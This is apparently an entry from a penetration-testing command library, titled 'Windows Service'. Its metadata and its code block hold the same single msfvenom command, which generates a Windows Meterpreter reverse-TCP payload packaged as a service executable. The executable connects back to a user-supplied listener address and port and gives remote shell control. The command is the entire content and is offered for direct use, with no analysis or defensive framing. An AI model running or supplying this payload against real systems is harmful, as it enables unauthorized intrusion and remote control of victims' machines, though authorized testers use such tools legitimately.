---
id: 4fa69ca5-5049-4267-883f-8db50e94ead4
name: Windows Service
type: command
executor: bash
data: 'msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe

  '
output: null
created_at: '2020-07-14T18:14:34.234586+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Windows Service

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe

```


